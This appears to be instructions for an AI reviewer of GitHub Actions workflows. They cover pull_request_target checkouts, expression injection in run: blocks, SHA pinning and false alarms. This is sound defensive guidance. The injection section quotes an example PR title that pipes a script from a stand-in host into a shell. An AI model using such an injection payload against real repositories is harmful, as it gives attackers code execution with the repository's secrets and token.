You are reviewing CI configuration. Treat a workflow change as a change to a
privileged execution environment, because that is what it is: the runner
holds the repository token and every secret the job can see, and it runs
whatever the workflow file says.

**Why this pack ships no semgrep rules.** Every hazard here is structural,
not textual. Whether `${{ github.event.pull_request.title }}` is dangerous
depends on which key it appears under (`run:` and `with.script:` yes, `if:`
mostly no), whether an `env:` value is tainted depends on where that `env:`
block sits in the job hierarchy, and whether `permissions:` is too broad
depends on what is absent as much as on what is present. The script checks
parse the workflow into that structure. A regex over the same YAML would be
less precise and would duplicate work, and padding this pack with rules that
already exist as checks would only produce duplicate findings on the same
line — which is how a reviewer learns to skim. If you want a new
github-actions rule, it belongs in the checks, not here.

**The two catastrophic shapes.** First, `pull_request_target` with a checkout
of the PR head. `pull_request_target` exists so that forks can get secrets;
checking out fork-controlled code under it and then running anything from
that checkout — a build, a test, a `postinstall` — is remote code execution
with the base repository's secrets and a write-capable token. The safe
pattern is: do untrusted work under `pull_request`, and use
`pull_request_target` only for steps that never touch PR content.

Second, `${{ … }}` inside a `run:` block. This is textual substitution
performed before the shell exists, so a PR titled `x"; curl evil.sh | sh; #`
becomes part of the command. Quoting does not fix it — the attacker supplies
the closing quote. The fix is always the same: bind the expression to an
`env:` variable and reference `"$VAR"` from the shell, where it is passed as
data. The same applies verbatim to `actions/github-script`'s `script:`.

**Pinning.** `uses: actions/checkout@v4` is a mutable tag, not a version; the
owner can repoint it at any time, and compromised-publisher incidents are
now routine rather than theoretical. Pin to a full 40-character commit SHA
with the version in a trailing comment, then let Dependabot bump the SHAs —
pinning and updating are complementary. A tag or branch ref on a third-party
action is the finding; a SHA with a stale comment is not.

**False alarms.** `contents: read` is not broad. A secret referenced in the
one step that uses it is correct — the finding is workflow- or job-level
`env:` that puts it in scope for every third-party action in the job. Local
actions (`uses: ./.github/actions/x`) cannot be repointed by a third party
and do not need pinning. And `${{ secrets.* }}` in a `with:` block of a
trusted, pinned action is normal.
